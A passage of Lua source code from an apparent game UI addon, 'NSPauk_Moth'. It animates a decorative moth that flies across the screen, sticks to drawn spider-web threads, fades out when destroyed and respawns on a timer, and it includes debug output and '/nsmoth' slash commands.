            if IsFrameObject(v) then
                vs = FrameLabel(v)
            else
                vs = "<" .. vt .. ">"
            end
        else
            vs = tostring(v)
        end

        self:Print(label, "key:", tostring(k), "=", vs)
    end

    self:Print(label, "keys shown:", shown, "of", #keys)
end

function NSPauk_Moth:DumpStuckOwner(max)
    max = max or 50

    local i = self.stuckInfo

    if not i or not i.stuck or type(i.owner) ~= "table" then
        self:Print("not stuck or no owner")
        return
    end

    self:DumpObjectKeys(i.owner, "stuckOwner", max)
end

---------------------------------------------------------------------------
-- Detailed frame debug
---------------------------------------------------------------------------

function NSPauk_Moth:DescribeFrame(label, f)
    if not IsFrameObject(f) then
        self:Print(label, "=", tostring(f), "(not a frame object)")
        return
    end

    local name = f.GetName and f:GetName() or nil
    local otype = f.GetObjectType and f:GetObjectType() or "?"

    self:Print(label, ":", otype, "name=", tostring(name), "obj=", tostring(f))

    if f.GetParent then
        self:Print(label, "parent=", FrameLabel(f:GetParent()))
    end

    if f.GetFrameStrata then
        self:Print(
            label,
            "strata=", tostring(f:GetFrameStrata()),
            "level=", tostring(f.GetFrameLevel and f:GetFrameLevel() or "?")
        )
    end

    if f.IsShown then
        self:Print(
            label,
            "shown=", tostring(f:IsShown()),
            "visible=", tostring(f.IsVisible and f:IsVisible() or "?")
        )
    end

    if f.GetWidth then
        self:Print(
            label,
            "size=", string.format("%.1f x %.1f", f:GetWidth() or 0, f:GetHeight() or 0)
        )
    end

    if f.IsMouseEnabled then
        self:Print(label, "mouse=", tostring(f:IsMouseEnabled()))
    end

    if f.GetNumPoints then
        local n = f:GetNumPoints()

        self:Print(label, "points=", n)

        for i = 1, n do
            local point, relativeTo, relativePoint, x, y = f:GetPoint(i)

            self:Print(
                label,
                "point", i, "=", tostring(point),
                "rel=", FrameLabel(relativeTo),
                "relPoint=", tostring(relativePoint),
                "offset=", string.format("%.1f,%.1f", x or 0, y or 0)
            )
        end
    end
end

function NSPauk_Moth:DebugFrames()
    self:Print("=== frame debug ===")
    self:Print("parentMode=", tostring(self.parentMode or "auto"))
    self:Print("anchor=", FrameLabel(self:GetAnchorFrame()))

    local s = self.state

    self:Print(
        "state:",
        "inited=", tostring(self.inited),
        "dead=", tostring(s.dead),
        "stuck=", tostring(s.stuckOwner ~= nil),
        "pos=", string.format("%.1f,%.1f", s.x, s.y)
    )

    self:DescribeFrame("NSPauk_Moth.frame", self.frame)

    if self.tex then
        self:Print("NSPauk_Moth.tex:", "obj=", tostring(self.tex))

        if self.tex.GetTexture then
            self:Print("tex texture=", tostring(self.tex:GetTexture()))
        end

        if self.tex.GetWidth then
            self:Print(
                "tex size=",
                string.format("%.1f x %.1f", self.tex:GetWidth() or 0, self.tex:GetHeight() or 0)
            )
        end

        if self.tex.GetAlpha then
            self:Print("tex alpha=", tostring(self.tex:GetAlpha()))
        end

        if self.tex.IsShown then
            self:Print("tex shown=", tostring(self.tex:IsShown()))
        end

        if self.tex.GetDrawLayer then
            self:Print("tex drawLayer=", tostring(self.tex:GetDrawLayer()))
        end
    else
        self:Print("NSPauk_Moth.tex = nil")
    end

    self:DescribeFrame("UIParent", UIParent)

    if type(NSPauk) == "table" then
        self:Print("NSPauk = table")

        if type(NSPauk.C) == "table" then
            self:Print("NSPauk.C.TEX_WEB=", tostring(NSPauk.C.TEX_WEB))
        end

        self:DescribeFrame("NSPauk.F_HIGH", NSPauk.F_HIGH)

        if type(NSPauk.S) == "table" and type(NSPauk.S.instances) == "table" then
            local count = 0

            for _ in pairs(NSPauk.S.instances) do
                count = count + 1
            end

            self:Print("NSPauk.S.instances count=", count)
        else
            self:Print("NSPauk.S.instances = not available")
        end
    else
        self:Print("NSPauk =", tostring(NSPauk))
    end

    self:DescribeFrame("_G.NSPauk_WebHigh", _G.NSPauk_WebHigh)

    if type(NSPauk) == "table" then
        self:Print("NSPauk.F_HIGH == _G.NSPauk_WebHigh:", tostring(NSPauk.F_HIGH == _G.NSPauk_WebHigh))
    end

    if s.stuckOwner and type(s.stuckOwner.thread) == "table" then
        local th = s.stuckOwner.thread

        self:Print("stuck thread p0=", PointToString(th.p0), "p2=", PointToString(th.p2))

        local bx, by = self:ThreadPointAt(th, s.stuckT)

        self:Print(
            "stuck base point=", string.format("%.1f,%.1f", bx, by),
            "t=", string.format("%.3f", s.stuckT)
        )
    end
end

function NSPauk_Moth:DebugState()
    local s = self.state
    local sw, sh = self:ScreenSize()
    local speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)

    self:Print("=== state debug ===")

    self:Print(
        "inited=", tostring(self.inited),
        "dead=", tostring(s.dead),
        "deadTimer=", string.format("%.1f", s.deadTimer or 0),
        "destroyed=", tostring(self.destroyed),
        "frozen=", tostring(s.frozen)
    )

    self:Print(
        "pos=", string.format("%.1f,%.1f", s.x, s.y),
        "vel=", string.format("%.1f,%.1f", s.vx, s.vy),
        "speed=", string.format("%.1f", speed)
    )

    self:Print(
        "screen=", string.format("%.1f,%.1f", sw, sh),
        "stuck=", tostring(s.stuckOwner ~= nil),
        "immunity=", string.format("%.2f", s.clickImmunity or 0)
    )

    self:Print(
        "stick conns=", tostring(self.cfg.STICK_CONNS),
        "crossSegs=", tostring(self.cfg.STICK_CROSSSEGS),
        "strict=", tostring(self.cfg.STICK_ONLY_VISIBLE_TEXTURE),
        "visibleRadius=", tostring(self.cfg.STICK_VISIBLE_RADIUS)
    )

    self:Print(
        "chance=", tostring(self.cfg.STICK_CHANCE),
        "requireLeave=", tostring(self.cfg.STICK_FAIL_REQUIRE_LEAVE)
    )

    if self.respawnRemaining then
        local sec = math.floor(self.respawnRemaining + 0.5)
        self:Print(
            "respawn timer=",
            string.format("%d:%02d", math.floor(sec / 60), sec % 60)
        )
    else
        self:Print("respawn timer= none")
    end

    if self.lastWebInfo then
        self:Print(
            "lastWeb:",
            tostring(self.lastWebInfo.source),
            "inst=", tostring(self.lastWebInfo.inst),
            "index=", tostring(self.lastWebInfo.index),
            "t=", string.format("%.3f", self.lastWebInfo.t or 0),
            "dist=", string.format("%.2f", self.lastWebInfo.dist or 0),
            "visible=", tostring(self.lastWebInfo.visibleTexture),
            "rejected=", tostring(self.lastWebInfo.rejected)
        )
    else
        self:Print("lastWeb= nil")
    end

    if self.frame then
        self:Print(
            "frame shown=", tostring(self.frame:IsShown()),
            "visible=", tostring(self.frame.IsVisible and self.frame:IsVisible() or "?"),
            "mouse=", tostring(self.frame.IsMouseEnabled and self.frame:IsMouseEnabled() or "?")
        )
    end

    if s.stuckOwner then
        local owner = s.stuckOwner

        self:Print(
            "owner alive=", tostring(owner.alive),
            "thread valid=", tostring(self:ThreadIsValid(owner.thread))
        )

        if type(owner.thread) == "table" then
            self:Print(
                "thread p0=", PointToString(owner.thread.p0),
                "p2=", PointToString(owner.thread.p2)
            )

            local bx, by = self:ThreadPointAt(owner.thread, s.stuckT)

            self:Print(
                "base point=", string.format("%.1f,%.1f", bx, by),
                "t=", string.format("%.3f", s.stuckT)
            )
        end
    end
end

function NSPauk_Moth:DebugLastWeb()
    local i = self.lastWebInfo

    if not i then
        self:Print("lastWebInfo = nil")
        return
    end

    self:Print("=== last web info ===")

    self:Print(
        "source=", tostring(i.source),
        "inst=", tostring(i.inst),
        "index=", tostring(i.index)
    )

    self:Print(
        "t=", string.format("%.3f", i.t or 0),
        "dist=", string.format("%.2f", i.dist or 0)
    )

    self:Print(
        "base=", string.format("%.1f,%.1f", i.baseX or 0, i.baseY or 0),
        "visibleTexture=", tostring(i.visibleTexture),
        "rejected=", tostring(i.rejected)
    )
end

function NSPauk_Moth:DebugWeb()
    local s = self.state
    local radius = self.cfg.DEBUG_WEB_RADIUS or 120

    self:Print("=== web debug ===")

    self:Print(
        "pos=", string.format("%.1f,%.1f", s.x, s.y),
        "radius=", radius
    )

    self:Print(
        "stick conns=", tostring(self.cfg.STICK_CONNS),
        "crossSegs=", tostring(self.cfg.STICK_CROSSSEGS),
        "strict=", tostring(self.cfg.STICK_ONLY_VISIBLE_TEXTURE),
        "visibleRadius=", tostring(self.cfg.STICK_VISIBLE_RADIUS),
        "chance=", tostring(self.cfg.STICK_CHANCE)
    )

    if self.lastWebInfo then
        self:Print(
            "lastWeb:",
            tostring(self.lastWebInfo.source),
            "inst=", tostring(self.lastWebInfo.inst),
            "index=", tostring(self.lastWebInfo.index),
            "t=", string.format("%.3f", self.lastWebInfo.t or 0),
            "dist=", string.format("%.2f", self.lastWebInfo.dist or 0),
            "visible=", tostring(self.lastWebInfo.visibleTexture),
            "rejected=", tostring(self.lastWebInfo.rejected)
        )
    else
        self:Print("lastWeb= nil")
    end

    if s.stuckOwner then
        local owner = s.stuckOwner

        self:Print(
            "stuckOwner alive=", tostring(owner.alive),
            "hidden=", tostring(owner.hidden),
            "visible=", tostring(owner.visible)
        )

        if type(owner.thread) == "table" then
            self:Print(
                "stuck thread p0=", PointToString(owner.thread.p0),
                "p1=", PointToString(owner.thread.p1),
                "p2=", PointToString(owner.thread.p2)
            )

            local bx, by = self:ThreadPointAt(owner.thread, s.stuckT)

            self:Print(
                "stuck base point=", string.format("%.1f,%.1f", bx, by),
                "t=", string.format("%.3f", s.stuckT)
            )
        end

        self:DumpObjectKeys(owner, "stuckOwner", 35)
    else
        self:Print("stuckOwner= nil")
    end

    if type(NSPauk) == "table"
        and type(NSPauk.S) == "table"
        and type(NSPauk.S.instances) == "table" then

        local found = {}
        local r2 = radius * radius

        local function addNear(source, instIndex, index, obj)
            if type(obj) == "table"
                and obj.alive
                and obj.hidden ~= true
                and obj.visible ~= false
                and self:ThreadIsValid(obj.thread) then

                if self:ThreadNearBox(obj.thread, s.x, s.y, radius + 4) then
                    local t, d2 = self:NearestThreadT(obj.thread, s.x, s.y)

                    if d2 <= r2 then
                        found[#found + 1] = {
                            source = source,
                            inst = tostring(instIndex),
                            index = tostring(index),
                            t = t,
                            dist = math.sqrt(d2),
                            thread = obj.thread,
                            alive = obj.alive,
                            hidden = obj.hidden,
                            visible = obj.visible,
                        }
                    end
                end
            end
        end

        for instIndex, inst in pairs(NSPauk.S.instances) do
            if type(inst) == "table" then
                if type(inst.conns) == "table" then
                    for connIndex, conn in pairs(inst.conns) do
                        addNear("conns", instIndex, connIndex, conn)
                    end
                end

                if type(inst.crossSegs) == "table" then
                    for segIndex, seg in pairs(inst.crossSegs) do
                        addNear("crossSegs", instIndex, segIndex, seg)
                    end
                end
            end
        end

        table.sort(found, function(a, b)
            return a.dist < b.dist
        end)

        self:Print("nearby alive threads:", #found)

        for i = 1, math.min(#found, 10) do
            local f = found[i]

            self:Print(
                "thread", i, "=", f.source,
                "inst=", f.inst,
                "index=", f.index,
                "dist=", string.format("%.2f", f.dist),
                "t=", string.format("%.3f", f.t),
                "alive=", tostring(f.alive),
                "hidden=", tostring(f.hidden),
                "visible=", tostring(f.visible)
            )

            if type(f.thread) == "table" then
                self:Print(
                    "thread", i,
                    "p0=", PointToString(f.thread.p0),
                    "p1=", PointToString(f.thread.p1),
                    "p2=", PointToString(f.thread.p2)
                )
            end
        end
    else
        self:Print("NSPauk.S.instances = not available")
    end

    local web = self:GetWebFrame()

    if IsFrameObject(web) then
        local regions = self:GetWebRegions(web)

        local texCount = 0
        local nearCount = 0
        local printed = 0
        local texRadius = radius

        local parentW = web.GetWidth and web:GetWidth() or 0
        local parentH = web.GetHeight and web:GetHeight() or 0

        for _, reg in ipairs(regions) do
            if reg.GetObjectType and reg:GetObjectType() == "Texture" then
                texCount = texCount + 1

                local shown = true

                if reg.IsShown then
                    shown = reg:IsShown()
                end

                local alpha = 1

                if reg.GetAlpha then
                    alpha = reg:GetAlpha() or 1
                end

                if shown and alpha > 0.01 then
                    local w = reg.GetWidth and reg:GetWidth() or 0
                    local h = reg.GetHeight and reg:GetHeight() or 0

                    local isFullScreenish = w > parentW * 0.8 and h > parentH * 0.8

                    if not isFullScreenish then
                        local near = false
                        local reason = ""

                        if reg.GetPoint then
                            local point, relTo, relPoint, px, py = reg:GetPoint(1)

                            if px and py then
                                local relName = nil

                                if type(relTo) == "string" then
                                    relName = relTo
                                elseif relTo and relTo.GetName then
                                    relName = relTo:GetName()
                                end

                                local okRel = (relTo == nil)
                                    or (relTo == web)
                                    or (relTo == UIParent)
                                    or relName == "NSPauk_WebHigh"
                                    or relName == "UIParent"

                                if okRel then
                                    local baseX, baseY = AnchorBaseCoords(relPoint, parentW, parentH)

                                    local ax = baseX + px
                                    local ay = baseY + py

                                    local cx, cy = RegionPointCenter(point, ax, ay, w, h)

                                    local dx = cx - s.x
                                    local dy = cy - s.y

                                    if dx * dx + dy * dy <= texRadius * texRadius then
                                        near = true
                                        reason = "point"
                                    end
                                end
                            end
                        end

                        if near then
                            nearCount = nearCount + 1

                            if printed < 12 then
                                printed = printed + 1

                                self:Print(
                                    "near texture", printed, "=",
                                    "reason=", reason,
                                    "alpha=", tostring(reg.GetAlpha and reg:GetAlpha() or "?"),
                                    "shown=", tostring(reg.IsShown and reg:IsShown() or "?"),
                                    "size=", string.format(
                                        "%.1fx%.1f",
                                        reg.GetWidth and reg:GetWidth() or 0,
                                        reg.GetHeight and reg:GetHeight() or 0
                                    ),
                                    "tex=", tostring(reg.GetTexture and reg:GetTexture() or "?")
                                )
                            end
                        end
                    end
                end
            end
        end

        self:Print(
            "web frame textures:", texCount,
            "near:", nearCount,
            "printed:", printed
        )
    else
        self:Print("web frame unavailable")
    end
end

---------------------------------------------------------------------------
-- Respawn timer
---------------------------------------------------------------------------

function NSPauk_Moth:EnsureTimerFrame()
    if self.timerFrame then
        return
    end

    local f = CreateFrame("Frame")

    f:Hide()

    f:SetScript("OnUpdate", function(_, elapsed)
        NSPauk_Moth:OnRespawnTimer(elapsed)
    end)

    self.timerFrame = f
end

function NSPauk_Moth:ScheduleRespawn()
    local min = self.cfg.RESPAWN_MIN_SECONDS or (10 * 60)
    local max = self.cfg.RESPAWN_MAX_SECONDS or (30 * 60)

    if max < min then
        max = min
    end

    self.respawnRemaining = math.random(min, max)
    self.respawnAt = (GetTime and GetTime() or 0) + self.respawnRemaining

    self:EnsureTimerFrame()

    if self.timerFrame then
        self.timerFrame:Show()
    end
end

function NSPauk_Moth:CancelRespawn()
    self.respawnRemaining = nil
    self.respawnAt = nil

    if self.timerFrame then
        self.timerFrame:Hide()
    end
end

function NSPauk_Moth:OnRespawnTimer(dt)
    if not self.respawnRemaining then
        if self.timerFrame then
            self.timerFrame:Hide()
        end

        return
    end

    self.respawnRemaining = self.respawnRemaining - dt

    if self.respawnRemaining <= 0 then
        self:Respawn()
    end
end



---------------------------------------------------------------------------
-- Freeze / Destroy
---------------------------------------------------------------------------

function NSPauk_Moth:Freeze()
    if self.destroyed then
        return
    end

    if not self.inited then
        self.freezeRequested = true
        self:Init()
        return
    end

    self.state.frozen = true

    if self.frame then
        self.frame:EnableMouse(false)
        self.frame:SetScript("OnUpdate", nil)
        self.frame:Show()
    end
end


---------------------------------------------------------------------------
-- OnUpdate
---------------------------------------------------------------------------

function NSPauk_Moth:OnUpdate(dt)
    if not self.inited or not self.frame or self.destroyed then
        return
    end

    local s = self.state

    if not s or s.frozen then
        return
    end

    dt = dt or 0

    if dt > 0.1 then
        dt = 0.1
    end

    local cfg = self.cfg

    -----------------------------------------------------------------------
    -- Уничтожение: застывает и 10 секунд плавно исчезает.
    -----------------------------------------------------------------------
    if s.dead then
        s.deadTimer = s.deadTimer + dt

        local alpha = 1 - (s.deadTimer / cfg.DEATH_FADE_TIME)

        if alpha < 0 then
            alpha = 0
        end

        if self.tex then
            self.tex:SetAlpha(alpha)
        end

        if alpha <= 0 then
            self:Destroy()
        end

        return
    end

    if s.clickImmunity > 0 then
        s.clickImmunity = s.clickImmunity - dt
    end

    -----------------------------------------------------------------------
    -- Быстрое и слегка случайное махание крыльями.
    -----------------------------------------------------------------------
    s.flapTimer = s.flapTimer + dt

    if s.flapTimer >= s.flapInterval then
        s.flapTimer = 0

        local base = s.stuckOwner and cfg.FLAP_STUCK or cfg.FLAP_FLY
        s.flapInterval = base * (0.65 + math.random() * 0.70)

        self:SetWing(not s.wing)
    end

    -----------------------------------------------------------------------
    -- Если прилип к паутине, дергается на нити.
    -----------------------------------------------------------------------
    if s.stuckOwner then
        local owner = s.stuckOwner

        if not owner
            or not owner.alive
            or not self:ThreadIsValid(owner.thread) then
            self:Release()
        else
            local baseX, baseY = self:ThreadPointAt(owner.thread, s.stuckT)

            s.twitchTimer = s.twitchTimer - dt

            if s.twitchTimer <= 0 then
                s.twitchTimer = cfg.STUCK_JERK_MIN
                    + math.random() * (cfg.STUCK_JERK_MAX - cfg.STUCK_JERK_MIN)

                local a = math.random() * 2 * math.pi
                local imp = cfg.STUCK_JERK_SPEED_MIN
                    + math.random() * (cfg.STUCK_JERK_SPEED_MAX - cfg.STUCK_JERK_SPEED_MIN)

                s.twitchVelX = s.twitchVelX + math.cos(a) * imp
                s.twitchVelY = s.twitchVelY + math.sin(a) * imp
            end

            local ax = -s.offX * cfg.STUCK_SPRING - s.twitchVelX * cfg.STUCK_DAMP
            local ay = -s.offY * cfg.STUCK_SPRING - s.twitchVelY * cfg.STUCK_DAMP

            s.twitchVelX = s.twitchVelX + ax * dt
            s.twitchVelY = s.twitchVelY + ay * dt

            s.offX = s.offX + s.twitchVelX * dt
            s.offY = s.offY + s.twitchVelY * dt

            local offLen = math.sqrt(s.offX * s.offX + s.offY * s.offY)

            if offLen > cfg.STUCK_OFFSET_MAX then
                local scale = cfg.STUCK_OFFSET_MAX / offLen

                s.offX = s.offX * scale
                s.offY = s.offY * scale

                s.twitchVelX = s.twitchVelX * 0.35
                s.twitchVelY = s.twitchVelY * 0.35
            end

            s.x = baseX + s.offX
            s.y = baseY + s.offY

            self:Place()
            return
        end
    end

    -----------------------------------------------------------------------
    -- Свободный полёт.
    -----------------------------------------------------------------------

    s.speedTimer = s.speedTimer - dt

    if s.speedTimer <= 0 then
        s.speedTimer = 0.30 + math.random() * 0.95
        s.desiredSpeed = cfg.SPEED_MIN
            + math.random() * (cfg.SPEED_MAX - cfg.SPEED_MIN)
    end

    local speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)

    if speed < 1 then
        self:KickOff()
        speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)
    end

    local turn = (math.random() - 0.5) * 2 * cfg.TURN * dt
    local cosTurn = math.cos(turn)
    local sinTurn = math.sin(turn)

    local rvx = s.vx * cosTurn - s.vy * sinTurn
    local rvy = s.vx * sinTurn + s.vy * cosTurn

    s.vx, s.vy = rvx, rvy

    s.vx = s.vx + (math.random() - 0.5) * 2 * cfg.NOISE * dt
    s.vy = s.vy + (math.random() - 0.5) * 2 * cfg.NOISE * dt

    s.jerkTimer = s.jerkTimer - dt

    if s.jerkTimer <= 0 then
        s.jerkTimer = cfg.JERK_MIN + math.random() * (cfg.JERK_MAX - cfg.JERK_MIN)

        speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)

        if speed < 1 then
            self:KickOff()
            speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)
        end

        local baseAngle = math.atan2(s.vy, s.vx)
        local mode = math.random()
        local offset

        if mode < 0.60 then
            local side = (math.random() < 0.5) and -1 or 1
            offset = side * (math.pi / 4 + math.random() * math.pi / 2)
        elseif mode < 0.85 then
            offset = (math.random() - 0.5) * math.pi * 0.45
        else
            offset = math.pi + (math.random() - 0.5) * math.pi * 0.60
        end

        local imp = cfg.BURST_SPEED_MIN
            + math.random() * (cfg.BURST_SPEED_MAX - cfg.BURST_SPEED_MIN)

        s.vx = s.vx + math.cos(baseAngle + offset) * imp
        s.vy = s.vy + math.sin(baseAngle + offset) * imp
    end

    speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)

    if speed < 1 then
        self:KickOff()
        speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)
    end

    local maxBurst = cfg.SPEED_MAX * 1.65

    if speed > maxBurst then
        local scale = maxBurst / speed

        s.vx = s.vx * scale
        s.vy = s.vy * scale

        speed = maxBurst
    end

    local targetSpeed = s.desiredSpeed

    if targetSpeed < cfg.SPEED_MIN then
        targetSpeed = cfg.SPEED_MIN
    end

    local newSpeed = speed + (targetSpeed - speed) * math.min(1, dt * 2.2)

    if newSpeed < cfg.SPEED_MIN then
        newSpeed = cfg.SPEED_MIN
    end

    local scale = newSpeed / speed

    s.vx = s.vx * scale
    s.vy = s.vy * scale

    s.x = s.x + s.vx * dt
    s.y = s.y + s.vy * dt

    local sw, sh = self:ScreenSize()
    local bounced = false

    if s.x < cfg.MARGIN then
        s.x = cfg.MARGIN
        s.vx = math.abs(s.vx)
        s.vy = s.vy + (math.random() - 0.5) * 90
        bounced = true
    elseif s.x > sw - cfg.MARGIN then
        s.x = sw - cfg.MARGIN
        s.vx = -math.abs(s.vx)
        s.vy = s.vy + (math.random() - 0.5) * 90
        bounced = true
    end

    if s.y < cfg.MARGIN then
        s.y = cfg.MARGIN
        s.vy = math.abs(s.vy)
        s.vx = s.vx + (math.random() - 0.5) * 90
        bounced = true
    elseif s.y > sh - cfg.MARGIN then
        s.y = sh - cfg.MARGIN
        s.vy = -math.abs(s.vy)
        s.vx = s.vx + (math.random() - 0.5) * 90
        bounced = true
    end

    if bounced then
        local a = (math.random() - 0.5) * math.pi * 0.35
        local cosB = math.cos(a)
        local sinB = math.sin(a)

        local bvx = s.vx * cosB - s.vy * sinB
        local bvy = s.vx * sinB + s.vy * cosB

        s.vx, s.vy = bvx, bvy
    end

    -----------------------------------------------------------------------
    -- Проверка касания паутины.
    -----------------------------------------------------------------------
    s.checkTimer = s.checkTimer + dt

    if s.checkTimer >= cfg.CHECK_INTERVAL then
        s.checkTimer = 0

        if s.clickImmunity <= 0
            and type(NSPauk) == "table"
            and type(NSPauk.S) == "table"
            and type(NSPauk.S.instances) == "table" then

            local owner, t = self:FindWeb(s.x, s.y)

            if owner then
                s.stuckOwner = owner
                s.stuckT = t

                s.offX = 0
                s.offY = 0
                s.twitchVelX = 0
                s.twitchVelY = 0
                s.twitchTimer = 0

                s.clickImmunity = 0

                s.flapInterval = cfg.FLAP_STUCK * (0.65 + math.random() * 0.70)

                s.x, s.y = self:ThreadPointAt(owner.thread, t)
            end
        end
    end

    self:Place()
end

---------------------------------------------------------------------------
-- FIX: full state reset after destroy / respawn
---------------------------------------------------------------------------

function NSPauk_Moth:ResetState()
    self.state = self.state or {}

    local s = self.state

    local sw, sh = 1, 1

    if self.ScreenSize then
        sw, sh = self:ScreenSize()
    end

    local flapFly = 0.04

    if self.cfg and self.cfg.FLAP_FLY then
        flapFly = self.cfg.FLAP_FLY
    end

    s.x = sw * 0.5
    s.y = sh * 0.5

    s.vx = 0
    s.vy = 0

    s.desiredSpeed = 120
    s.speedTimer = 0
    s.jerkTimer = 0

    s.wing = false
    s.flapTimer = 0
    s.flapInterval = flapFly * (0.65 + math.random() * 0.70)

    s.checkTimer = 0

    s.stuckOwner = nil
    s.stuckT = 0

    s.offX = 0
    s.offY = 0
    s.twitchVelX = 0
    s.twitchVelY = 0
    s.twitchTimer = 0

    s.dead = false
    s.deadTimer = 0

    s.clickImmunity = 0

    s.webFailUntil = 0
    s.webFailActive = false

    s.frozen = false
    s.destroyed = false
end

---------------------------------------------------------------------------
-- Замена Init()
---------------------------------------------------------------------------

function NSPauk_Moth:Init()
    if self.destroyed then
        return
    end

    if self.inited then
        return
    end

    self.state = self.state or {}

    local shouldFreeze = self.freezeRequested or self.state.frozen

    self:ResetState()

    self:CreateWidgets()

    local sw, sh = self:ScreenSize()
    local s = self.state

    s.x = sw * 0.5
    s.y = sh * 0.5

    self:KickOff()

    if self.tex then
        self.tex:SetAlpha(1)
    end

    if self.frame then
        self.frame:EnableMouse(true)
    end

    self.inited = true

    _G.NSPauk_Moth_StuckInfo = self.stuckInfo

    self:Place()
    self:Show()

    if self.UpdateStuckInfo then
        self:UpdateStuckInfo()
    end

    if shouldFreeze then
        self.freezeRequested = false
        s.frozen = true

        if self.frame then
            self.frame:EnableMouse(false)
            self.frame:SetScript("OnUpdate", nil)
            self.frame:Show()
        end
    end
end

---------------------------------------------------------------------------
-- Замена Destroy()
---------------------------------------------------------------------------

function NSPauk_Moth:Destroy()
    if self.destroyed then
        return
    end

    self.destroyed = true
    self.freezeRequested = false
    self.inited = false

    if self.HideDebugMarkers then
        self:HideDebugMarkers()
    end

    if self.bootstrap then
        if self.bootstrap.UnregisterAllEvents then
            self.bootstrap:UnregisterAllEvents()
        end

        if self.bootstrap.SetScript then
            self.bootstrap:SetScript("OnEvent", nil)
        end

        self.bootstrap = nil
    end

    if self.frame then
        self.frame:EnableMouse(false)

        self.frame:SetScript("OnUpdate", nil)
        self.frame:SetScript("OnMouseDown", nil)

        self.frame:Hide()
        self.frame:ClearAllPoints()

        if self.frame.SetParent then
            self.frame:SetParent(nil)
        end
    end

    if self.tex then
        self.tex:SetTexture(nil)
        self.tex:ClearAllPoints()
        self.tex:Hide()
    end

    self.frame = nil
    self.tex = nil

    self.tex1 = nil
    self.tex2 = nil

    self.lastWebInfo = nil

    self.webRegionsCache = nil
    self.webRegionsCacheTime = nil
    self.webRegionsCacheWeb = nil

    self.lastStuckInfo = nil

    if self.stuckInfo then
        local keys = {}

        for k in pairs(self.stuckInfo) do
            keys[#keys + 1] = k
        end

        for _, k in ipairs(keys) do
            self.stuckInfo[k] = nil
        end

        self.stuckInfo.destroyed = true
        self.stuckInfo.stuck = false
    end

    if _G.NSPauk_MothFrame then
        _G.NSPauk_MothFrame = nil
    end

    _G.NSPauk_Moth_StuckInfo = self.stuckInfo

    self:ResetState()

    self.state.frozen = true
    self.state.destroyed = true

    self:ScheduleRespawn()
end

---------------------------------------------------------------------------
-- Замена Respawn()
---------------------------------------------------------------------------

function NSPauk_Moth:Respawn()
    self:CancelRespawn()

    if not self.destroyed and self.inited then
        return
    end

    self.destroyed = false
    self.freezeRequested = false

    if self.state then
        self.state.frozen = false
        self.state.destroyed = false
        self.state.dead = false
    end

    self.inited = false

    self:Init()
end

function NSPauk_Moth:Show()
    if self.destroyed then
        return
    end

    if not self.inited then
        self:Init()
        return
    end

    if self.state.dead then
        return
    end

    if self.frame then
        self.frame:Show()
    end

    if self.tex then
        self.tex:SetAlpha(1)
    end
end

function NSPauk_Moth:Hide()
    if self.frame then
        self.frame:Hide()
    end
end

function NSPauk_Moth:Toggle()
    if self.destroyed or not self.frame then
        return
    end

    if self.frame:IsShown() then
        self:Hide()
    elseif not self.state.dead then
        self:Show()
    end
end

---------------------------------------------------------------------------
-- Slash commands
---------------------------------------------------------------------------

SLASH_NSPAUKMOTH1 = "/nsmoth"

SlashCmdList["NSPAUKMOTH"] = function(msg)
    local m = TrimLower(msg)

    if m == "" or m == "help" then
        NSPauk_Moth:Print("commands:")
        NSPauk_Moth:Print("/nsmoth where -- show current stuck info")
        NSPauk_Moth:Print("/nsmoth owner -- dump stuck owner keys")
        NSPauk_Moth:Print("/nsmoth frames -- detailed frame debug")
        NSPauk_Moth:Print("/nsmoth state -- state debug")
        NSPauk_Moth:Print("/nsmoth web -- detailed web debug")
        NSPauk_Moth:Print("/nsmoth last -- last web candidate info")
        NSPauk_Moth:Print("/nsmoth freeze -- freeze moth")
        NSPauk_Moth:Print("/nsmoth destroy -- destroy moth and start respawn timer")
        NSPauk_Moth:Print("/nsmoth respawn -- respawn moth now")
        NSPauk_Moth:Print("/nsmoth timer -- show respawn timer")
        NSPauk_Moth:Print("/nsmoth parent -- show current parent mode")
        NSPauk_Moth:Print("/nsmoth parent auto|web|ui -- set parent mode")
        NSPauk_Moth:Print("/nsmoth cross on|off -- enable/disable crossSegs sticking")
        NSPauk_Moth:Print("/nsmoth conns on|off -- enable/disable conns sticking")
        NSPauk_Moth:Print("/nsmoth strict on|off -- require visible texture for sticking")
        NSPauk_Moth:Print("/nsmoth radius N -- visible texture check radius")
        NSPauk_Moth:Print("/nsmoth chance -- show current stick chance")
        NSPauk_Moth:Print("/nsmoth chance 1/3 -- set stick chance")
        return
    end

    if m == "frames" then
        NSPauk_Moth:DebugFrames()
        return
    end

    if m == "state" then
        NSPauk_Moth:DebugState()
        return
    end

    if m == "web" then
        NSPauk_Moth:DebugWeb()
        return
    end

    if m == "last" then
        NSPauk_Moth:DebugLastWeb()
        return
    end

    if m == "where" or m == "stuck" or m == "pos" then
        NSPauk_Moth:PrintStuckInfo()
        return
    end

    if m == "owner" then
        NSPauk_Moth:DumpStuckOwner(60)
        return
    end

    if m == "freeze" then
        NSPauk_Moth:Freeze()
        return
    end

    if m == "destroy" or m == "kill" or m == "remove" then
        NSPauk_Moth:Destroy()
        return
    end

    if m == "respawn" then
        NSPauk_Moth:Respawn()
        return
    end

    if m == "timer" then
        if NSPauk_Moth.respawnRemaining then
            local sec = math.floor(NSPauk_Moth.respawnRemaining + 0.5)
            NSPauk_Moth:Print(
                "respawn in",
                string.format("%d:%02d", math.floor(sec / 60), sec % 60)
            )
        else
            NSPauk_Moth:Print("no respawn timer")
        end
        return
    end

    if m == "parent" then
        NSPauk_Moth:Print(
            "parentMode=", tostring(NSPauk_Moth.parentMode or "auto"),
            "anchor=", FrameLabel(NSPauk_Moth:GetAnchorFrame())
        )
        return
    end

    if m == "cross" then
        NSPauk_Moth:Print("STICK_CROSSSEGS=", tostring(NSPauk_Moth.cfg.STICK_CROSSSEGS))
        return
    end

    if m == "conns" then
        NSPauk_Moth:Print("STICK_CONNS=", tostring(NSPauk_Moth.cfg.STICK_CONNS))
        return
    end

    if m == "strict" then
        NSPauk_Moth:Print(
            "STICK_ONLY_VISIBLE_TEXTURE=",
            tostring(NSPauk_Moth.cfg.STICK_ONLY_VISIBLE_TEXTURE),
            "radius=", tostring(NSPauk_Moth.cfg.STICK_VISIBLE_RADIUS)
        )
        return
    end

    if m == "radius" then
